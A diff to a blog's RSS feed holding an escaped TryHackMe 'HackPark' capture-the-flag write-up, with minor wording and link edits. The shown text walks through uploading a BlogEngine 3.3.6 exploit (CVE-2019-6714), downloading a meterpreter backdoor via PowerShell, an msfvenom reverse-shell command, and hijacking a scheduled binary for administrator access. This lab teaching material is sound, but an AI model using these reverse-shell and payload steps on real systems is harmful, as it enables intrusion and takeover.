@@ -5,8 +5,8 @@
     <description>Burak Baris</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 07 Jan 2022 21:15:54 +0000</pubDate>
-    <lastBuildDate>Fri, 07 Jan 2022 21:15:54 +0000</lastBuildDate>
+    <pubDate>Fri, 07 Jan 2022 21:21:13 +0000</pubDate>
+    <lastBuildDate>Fri, 07 Jan 2022 21:21:13 +0000</lastBuildDate>
     <generator>Jekyll v4.2.1</generator>
     
       <item>
@@ -815,15 +815,15 @@ Since the password is not strong enough, we have managed to crack it in a matter
 &lt;h2 id=&quot;searching-for-vulnerabilities&quot;&gt;Searching for Vulnerabilities&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/11.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Checking the version of the framework&lt;/em&gt;&lt;br /&gt;
 After logging in to the panel, under the About tab, we can see the version of the framework is 3.3.6
-&lt;br /&gt;&lt;br /&gt;After gathering the version information, we can check &lt;a href=&quot;https://www.exploit-db.com/exploits/46353&quot;&gt;Exploit-db&lt;/a&gt; to see
+&lt;br /&gt;&lt;br /&gt;After gathering the version information, we can check &lt;a href=&quot;https://www.exploit-db.com/exploits&quot;&gt;Exploit-db&lt;/a&gt; to see
 if there is any vulnerability on that version. I will use the &lt;strong&gt;searchsploit&lt;/strong&gt; utility, the CLI version
 of the Exploit-db.
 &lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 Multiple different exploits showed up. However, the first one is specifically for the version 3.3.6. We are going to
 use that. &lt;a href=&quot;https://portswigger.net/web-security/file-path-traversal&quot;&gt;Click to read more about &lt;em&gt;File Path, Directory Traversal&lt;/em&gt;&lt;/a&gt;.
 &lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h2 id=&quot;hacking-into-the-users-shell&quot;&gt;Hacking into the user’s shell&lt;/h2&gt;
-&lt;p&gt;Download the exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
+&lt;h2 id=&quot;hacking-into-the-users-shell&quot;&gt;Hacking Into the User’s Shell&lt;/h2&gt;
+&lt;p&gt;Download the &lt;a href=&quot;https://www.exploit-db.com/exploits/46353&quot;&gt;CVE-2019-6714&lt;/a&gt; exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
 &lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/13.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Editing 46353.cs file&lt;/em&gt;&lt;br /&gt;
 Rename the file as &lt;strong&gt;PostView.ascx&lt;/strong&gt;.
 &lt;br /&gt;&lt;br /&gt;Navigate to the Content tab, then click on the blog post to access the editor.
@@ -852,7 +852,7 @@ do it is to start a Python server.&lt;/p&gt;
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/19.png&quot; alt=&quot;&quot; /&gt;&lt;em&gt;Creating meterpreter backdoor and starting a Python server&lt;/em&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;br /&gt;Download the backdoor to the target system with the following Powershell commands:&lt;/p&gt;
+&lt;br /&gt;Download the backdoor to the target system with the following Powershell commands:&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\Temp&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;myfolder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
@@ -909,9 +909,9 @@ to walk around this.
 &lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 The scheduler executes a binary called Messages.exe every 23 seconds. 
 &lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-This binary is also in the modifiable directory. If we create a 
+This binary in the modifiable directory too. If we create a 
 backdoor and put it where Message.exe sits, we can escalate our privileges.
-&lt;br /&gt;&lt;br /&gt;Once again, let’s create a meterpreter reverse shell binary.&lt;/p&gt;
+&lt;br /&gt;&lt;br /&gt;Once again, let us create a meterpreter reverse shell binary.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;msfvenom&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--encoder&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x86/shikata_ga_nai&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOME&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;FREE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;revshell.exe&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -925,7 +925,7 @@ backdoor and put it where Message.exe sits, we can escalate our privileges.
 &lt;br /&gt;&lt;br /&gt;Rename the executable as Messages.exe (I forgot it should be named Messages.exe when creating it). 
 Then, replace the real binary with the malicious backdoor.
 &lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;br /&gt;Sit back and wait for session to initialize.
+&lt;br /&gt;&lt;br /&gt;Sit back and wait for the session to initialize.
 &lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 Voilà! We are the administrator now.
 &lt;img src=&quot;/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
